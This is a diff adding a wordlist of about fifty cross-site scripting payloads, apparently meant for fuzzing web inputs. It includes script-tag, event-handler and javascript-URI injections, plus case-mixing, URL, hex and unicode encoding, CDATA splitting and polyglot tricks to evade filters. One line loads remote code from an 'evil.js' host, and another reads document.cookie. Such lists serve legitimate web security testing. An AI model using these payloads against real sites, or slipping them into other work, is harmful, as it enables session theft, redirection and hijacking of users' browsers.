@@ -1,0 +1,50 @@
+"/><svg/onload=prompt()>
+"/><body onpageshow=prompt'google'//
+<script>alert('XSS')</script>
+<script>alert('XSS');</script>
+<script>javascript:alert('XSS')</script>
+<script>javascript:alert('XSS');</script>
+<script>onerror=prompt()</script>
+test</div><svg/onload=alert('google')>
+<onerror=prompt()>
+<IMG SRC='X' ONERROR=ALERT('google')>
+%3Cp%3E%3Cb%3E%3Cspan+style%3D%22font-size%3A+14px%3B%22%3E123%3C%2Fspan%3E%3C%2Fb%3E%3Cbr%3E%3C%2Fp%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+test%2522<svg/onload=alert('google')>test
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//\x3csVg/
+test<svg onload="alert(google)"></svg>
+<iframe src="javascript:alert()
+'></div><img src=x onerror=alert()>
+<iframe src="javascript:alert(`xss`)">
+test<script>alert('google')</script>test
+<script type=vbscript>MsgBox(0)</script>
+%00alert(0)
+test%22</div><img src=http://url onload=alert(0)//></img>
+<iframe src=x onerror=alert('google')>
+onmouseover="alert(1)"
+test"</span><script>alert()</script>
+<ScRiPt>JaVaScrIpT:AlErT()</ScRiPt>
+<scrIpt>prompt(0);</script>
+<script/src="http://test.com/evil.js">
+<script>delete alert;alert(1)</script>
+<svg><script/href= />
+<script>confirm(0);</script>
+<iframe src="javascript:alert(2)"
+<form><isindex formaction="javascript&colon;confirm(1)>
+<embed/code=google.com?
+<embed/src=google.com>
+<object/data=google.com>
+<isindex action=google.com type=image>
+<form action=google.com><input type="submit">
+<meta http-equiv="refresh" content="0;url=google.com">
+<applet code="javascript:confirm(document.cookie);">
+<iframe/src="data:text/html,<iframe/src=http://jsfiddle.net/d7Xu7/1/>">
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<isindex x="javascript:" onmouseover="alert(1)">
+"><p id="\u0070rompt(1)"onmouseover=\u0065val(id) //
+<q oncut=\u0070rompt(2)>
+"><p id=""onmouseover=\u0070rompt(1) //
+<a%20x%20href=javascript%26%2358%3Bprompt(1)>a</a>
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
+http://www.site.com/shop.php?c=4"><a fooooooooooooooooooooooooooooooooo href=JaVAScript%26colon%3Bprompt%26lpar%3B1%26rpar%3B%>
+http://www.site.com/shop.php?c="><a fooooooooooooooooooooooooooo href=javascript:alert(1)>CLICK</a>
+%3c%2f%64%69%76%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%73%63%72%69%70%74%3e
